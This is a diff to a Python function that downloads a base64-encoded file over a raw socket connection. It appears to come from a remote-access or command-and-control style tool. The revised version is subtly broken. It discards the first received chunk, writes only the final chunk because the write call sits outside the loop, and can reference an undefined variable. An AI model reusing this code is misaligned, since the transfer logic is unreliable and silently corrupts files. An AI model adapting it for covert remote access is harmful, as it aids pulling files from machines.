@@ -138,37 +138,34 @@ def file_transfer_get(conn, command):      #get file from server
     file = command.split()
     dest_filename = file[2]
     
-    print_info("Grabbing {} --> {}".format(command.split()[1], dest_filename))
-    while True: 
-        data = base64_decode(conn.recv(1024).decode('utf-8'))
-        if DEBUG:
-            print(data)
-        if "[file-not-found]" in data:
-            print_fail("File not found")          
-            break
-        elif "[file-found]" in data:
-            if VERBOSE:
-                print_good("File Found, Downloading...")
-            try:
-                with open(dest_filename,'wb') as f:
-                    data_b64 = ""
-                    recv_data = ""
-                    data = ""
-                    while not data.endswith('[END]'):
-                        data = conn.recv(128).decode('utf-8')
-                        recv_data = data + recv_data
-                        if DEBUG:
-                            print(recv_data)
+    if VERBOSE:
+        print_info("Trying to Download {} --> {}".format(command.split()[1], dest_filename))
+    
+    data = base64_decode(conn.recv(1024).decode('utf-8'))
+    if DEBUG:
+        print(data)
+    if "[file-not-found]" in data:
+        print_fail("File not found")          
+    elif "[file-found]" in data:
+        if VERBOSE:
+            print_good("File Found, Downloading...")
+        try:
+            with open(dest_filename,'wb') as f:
+                recv_data = conn.recv(128).decode('utf-8')
+                while not recv_data.endswith('[END]'):
+                    recv_data = conn.recv(128).decode('utf-8')
+                    print("Transferring...")
                     recv_decoded = base64_decode(recv_data.rstrip("[END]"))
-                    
-                    if type(recv_decoded) is str:
-                        f.write(recv_decoded.encode())
-                    else:
-                        f.write(recv_decoded)
-            except Exception as e:
-                print(exc_info)
-                print(e)
-                print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+                
+                if type(recv_decoded) is str:
+                    f.write(recv_decoded.encode())
+                else:
+                    f.write(recv_decoded)
+            print_good("File Downloaded!")
+        except Exception as e:
+            print(exc_info)
+            print(e)
+            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
 def file_transfer_put(conn, commands):       #push file to server
     send_data(conn, commands + "[END]")
